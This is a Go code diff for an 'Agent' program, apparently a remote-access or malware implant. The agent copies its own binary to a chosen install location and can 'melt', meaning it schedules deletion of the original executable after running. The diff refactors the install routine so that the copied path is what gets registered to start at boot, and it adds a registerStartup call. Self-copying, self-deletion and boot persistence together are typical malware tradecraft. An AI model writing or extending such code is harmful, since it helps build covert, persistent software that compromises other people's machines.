@@ -13,11 +13,14 @@ import (
 
 func (a *Agent) applyPreferences() {
 	installPath := strings.TrimSpace(a.preferences.InstallPath)
+	resolvedTarget := ""
 
 	if installPath != "" {
-		if err := a.ensureInstallation(installPath); err != nil {
+		dest, err := a.ensureInstallation(installPath)
+		if err != nil {
 			a.logger.Printf("failed to apply installation preference (%s): %v", installPath, err)
 		} else {
+			resolvedTarget = dest
 			a.logger.Printf("persisted agent binary at %s", installPath)
 		}
 	} else if a.preferences.MeltAfterRun {
@@ -25,7 +28,7 @@ func (a *Agent) applyPreferences() {
 	}
 
 	if a.preferences.StartupOnBoot {
-		target := installPath
+		target := resolvedTarget
 		if target == "" {
 			if exe, err := os.Executable(); err == nil {
 				target = exe
@@ -39,26 +42,26 @@ func (a *Agent) applyPreferences() {
 	}
 }
 
-func (a *Agent) ensureInstallation(target string) error {
+func (a *Agent) ensureInstallation(target string) (string, error) {
 	target = strings.TrimSpace(target)
 	if target == "" {
-		return nil
+		return "", nil
 	}
 
 	executable, err := os.Executable()
 	if err != nil {
-		return fmt.Errorf("resolve executable: %w", err)
+		return "", fmt.Errorf("resolve executable: %w", err)
 	}
 
 	executable, err = filepath.Abs(executable)
 	if err != nil {
-		return fmt.Errorf("resolve executable path: %w", err)
+		return "", fmt.Errorf("resolve executable path: %w", err)
 	}
 
 	destPath := target
 	if strings.HasSuffix(target, string(os.PathSeparator)) {
 		if err := os.MkdirAll(target, 0o755); err != nil {
-			return fmt.Errorf("create install directory: %w", err)
+			return "", fmt.Errorf("create install directory: %w", err)
 		}
 		destPath = filepath.Join(target, filepath.Base(executable))
 	} else {
@@ -67,33 +70,33 @@ func (a *Agent) ensureInstallation(target string) error {
 			destPath = filepath.Join(target, filepath.Base(executable))
 		} else if statErr != nil {
 			if !os.IsNotExist(statErr) {
-				return fmt.Errorf("inspect install path: %w", statErr)
+				return "", fmt.Errorf("inspect install path: %w", statErr)
 			}
 			parent := filepath.Dir(target)
 			if err := os.MkdirAll(parent, 0o755); err != nil {
-				return fmt.Errorf("prepare install parent: %w", err)
+				return "", fmt.Errorf("prepare install parent: %w", err)
 			}
 		}
 	}
 
 	destPath, err = filepath.Abs(destPath)
 	if err != nil {
-		return fmt.Errorf("resolve destination path: %w", err)
+		return "", fmt.Errorf("resolve destination path: %w", err)
 	}
 
 	if samePath(executable, destPath) {
-		return nil
+		return destPath, nil
 	}
 
 	if err := copyBinary(executable, destPath); err != nil {
-		return fmt.Errorf("copy binary: %w", err)
+		return "", fmt.Errorf("copy binary: %w", err)
 	}
 
 	if a.preferences.MeltAfterRun {
 		a.scheduleMelt(executable)
 	}
 
-	return nil
+	return destPath, nil
 }
 
 func (a *Agent) scheduleMelt(path string) {
@@ -109,6 +112,11 @@ func configureStartupPreference(target string) error {
 	target = strings.TrimSpace(target)
 	if target == "" {
 		return errors.New("no target provided for startup preference")
+	}
+
+	absTarget, err := filepath.Abs(target)
+	if err == nil {
+		target = absTarget
 	}
 
 	homeDir, err := os.UserHomeDir()
@@ -130,6 +138,10 @@ func configureStartupPreference(target string) error {
 	entryPath := filepath.Join(configDir, "startup-target.txt")
 	if err := os.WriteFile(entryPath, []byte(target+"\n"), 0o644); err != nil {
 		return fmt.Errorf("persist startup preference: %w", err)
+	}
+
+	if err := registerStartup(target); err != nil {
+		return fmt.Errorf("register startup entry: %w", err)
 	}
 
 	return nil
